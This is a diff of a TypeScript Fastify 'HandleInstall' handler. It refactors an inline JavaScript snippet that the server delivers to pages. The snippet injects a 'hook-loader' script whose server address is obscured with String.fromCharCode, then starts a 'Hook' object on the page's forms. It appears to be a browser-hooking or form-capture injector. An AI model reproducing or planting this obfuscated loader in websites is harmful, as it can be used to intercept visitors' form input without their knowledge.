@@ -16,21 +16,25 @@ export const HandleInstall = async (
     reply: FastifyReply,
 ) => {
     const inline_script =
-        `let {head: xh} = document, xb = document.createElement("script");
-xb.type = "text/javascript";
-xb.src = String.fromCharCode({server});
-xb.id = 'hook-loader';
-if(!document.querySelector('script[id="hook-loader"]'))
-xh.appendChild(xb);
-window.addEventListener("DOMContentLoaded", (event) => {
-  console.log("DOM fully loaded and parsed");
-  try {
-    window._LOL = window._LOL ?? new Hook();
-    window._LOL.init('form');
-        } catch (e) {
-            console.error(e);
-        }
-});
+        `if (typeof inject_hook !== 'function') {
+  function inject_hook() {
+    return new Promise(function (resolve, reject) {
+      let s;
+      s = document.createElement('script');
+      s.src = String.fromCharCode({server});
+      s.id = 'hook-loader';
+      s.onload = resolve;
+      s.onerror = reject;
+      document.head.appendChild(s);
+    });
+  }
+  inject_hook().catch(console.error)
+    .then(function () {
+      window._LOL = window._LOL ?? new Hook();
+      window._LOL.init('form');
+    }, console.error);
+
+}
 
 `.replace(
             '{server}',
